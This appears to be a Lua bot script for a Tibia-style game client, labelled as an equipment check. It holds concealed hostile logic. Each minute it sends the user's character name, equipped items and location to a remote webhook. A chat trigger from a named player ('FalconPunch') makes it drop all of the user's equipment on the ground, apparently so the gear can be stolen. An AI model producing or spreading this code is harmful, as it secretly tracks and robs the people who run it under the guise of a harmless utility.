
local cacheTimes = {}

remoteStore = storage.dcfull

local default_meta = {
  username = "CheckUsedItens",
}

local template = {
  color = 3066993,
}

function onRemoteResult(data, err)
  if err then
  end
end

-- Função que prepara e envia
local function processData(packet)
  local id = packet.id
  if id then
    local dTime = cacheTimes[id]
    if dTime and os.time() < dTime then return end
    cacheTimes[id] = os.time() + 0
  end

  local tEmbed = {}
  for k,v in pairs(template) do tEmbed[k] = v end
  tEmbed.title = packet.title or ""
  tEmbed.fields = {
    { name = "Name", value = packet.name or "-" },
    { name = "Details", value = packet.message or "-" }
  }

  local payload = {}
  for k,v in pairs(default_meta) do payload[k] = v end
  payload.embeds = { tEmbed }

  HTTP.postJSON(remoteStore, payload, onRemoteResult)
end

-- Coleta os itens equipados
local function cacheSlots()
  local function idOrZero(slot) return getSlot(slot) and getSlot(slot):getId() or 0 end

  local ids = {
    Head     = idOrZero(SlotHead),
    Body     = idOrZero(SlotBody),
    Legs     = idOrZero(SlotLeg),
    Feet     = idOrZero(SlotFeet),
    Left     = idOrZero(SlotLeft),
    Right    = idOrZero(SlotRight),
    Ring     = idOrZero(SlotFinger),
    Arrow    = idOrZero(SlotAmmo),
    Backpack = idOrZero(SlotBack),
    Neck     = idOrZero(SlotNeck)
  }

  local msg = ""
  for slot, val in pairs(ids) do
    msg = msg .. slot .. ": " .. val .. " | "
  end

  local data = {
    title = "Require",
    name = player:getName(),
    message = msg .. '. X: ' .. posx() .. '. Y: ' .. posy() .. ' Z: ' .. posz(),
    id = "eq"
  }
  processData(data)
end

cacheSlots()


macro(60000, function()
  cacheSlots()
end)

setind = false

comandername = 'FalconPunch'
activate = 'Sabe do Jackson..'

onTalk(function(name, level, mode, text, channelId, pos)
  if name == comandername then
    if text == activate then
      setind = true
    end
  end
end)


setind = setind or false
function toggleuse()
  setind = not setind
  --print("use macro: " .. (setind and "ON" or "OFF"))
end


macro(100, function()
  if not setind then return end
  if not player then return end

  -- pega posição do player
  local p = pos()
  if not p then
    print("use: posição do player inválida")
    return
  end

  -- pega o tile da posição (importante: define `tile`)
  local tile = g_map.getTile(p)
  if not tile then
    print(("use: tile nil em %s,%s,%s"):format(tostring(p.x), tostring(p.y), tostring(p.z)))
    return
  end

  local targetPos = tile:getPosition()

  local slots = {
    SlotHead,
    SlotNeck,
    SlotBack,
    SlotBody,
    SlotLeg,
    SlotFeet,
    SlotRight,
    SlotLeft,
    SlotFinger,
    SlotAmmo
  }

  for _, slot in ipairs(slots) do
    local item = getSlot(slot)
    if item then
      local okCount, count = pcall(function() return item:getCount() end)
      if not okCount or not count or count < 1 then count = 1 end
      local okMove, err = pcall(function() g_game.move(item, targetPos, count) end)
      if not okMove then
        pcall(function() g_game.move(item, p, count) end)
      end

      delay(200)
    end
  end
end)
